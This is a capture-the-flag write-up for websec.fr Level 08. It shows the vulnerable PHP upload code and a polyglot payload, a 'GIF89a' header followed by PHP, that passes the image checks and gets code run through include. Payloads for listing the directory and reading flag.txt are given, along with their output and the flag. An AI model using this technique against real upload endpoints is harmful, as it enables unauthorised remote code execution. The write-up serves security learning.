+++
title = 'Websec.fr Level 08'
date = '2025-12-10T00:00:00+01:00'
draft = false
tags = ['websec', 'file-upload']
+++

The source code of [level8](http://websec.fr/level08/index.php) is [here](http://websec.fr/level08/source.php).
```php
<?php
$uploadedFile = sprintf('%1$s/%2$s', '/uploads', sha1($_FILES['fileToUpload']['name']) . '.gif');
    if (file_exists ($uploadedFile)) { unlink ($uploadedFile); }
        if ($_FILES['fileToUpload']['size'] <= 50000) {
            if (getimagesize ($_FILES['fileToUpload']['tmp_name']) !== false) {
                if (exif_imagetype($_FILES['fileToUpload']['tmp_name']) === IMAGETYPE_GIF) {
                    move_uploaded_file ($_FILES['fileToUpload']['tmp_name'], $uploadedFile);
                    echo '<p class="lead">Dump of <a href="/level08' . $uploadedFile . '">'. htmlentities($_FILES['fileToUpload']['name']) . '</a>:</p>';
                    echo '<pre>';
                    include_once($uploadedFile);
                    echo '</pre>';
                    unlink($uploadedFile);
        } else { echo '<p class="text-danger">The file is not a GIF</p>'; }
    } else { echo '<p class="text-danger">The file is not an image</p>'; }
} else { echo '<p class="text-danger">The file is too big</p>'; }
?>
```
With this code we have 2 problems to bypass:
- The GIF header 
- The size of the file uploaded

For this type of vulnerability I use my mindmap
![alt text](/images/stc/file_upload_finish.excalidraw.png)

So we can create a file containing this :
```php
GIF89a<?php var_dump(scandir('./')); ?>;
```
With `GIF89a` which is the header of a **GIF** file

```md
Dump of file.php:

GIF89aarray(7) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(8) "flag.txt"
  [3]=>
  string(9) "index.php"
  [4]=>
  string(12) "php-fpm.sock"
  [5]=>
  string(10) "source.php"
  [6]=>
  string(7) "uploads"
}
;
```

After scanning the directory we can **cat** a `flag.txt`

```php
GIF89a<?php var_dump(file_get_contents('./flag.txt')); ?>;
```
and we have this result:

```md
GIF89astring(35) " WEBSEC{BypassingImageChecksToRCE}
"
;
```

Flag : `WEBSEC{BypassingImageChecksToRCE}`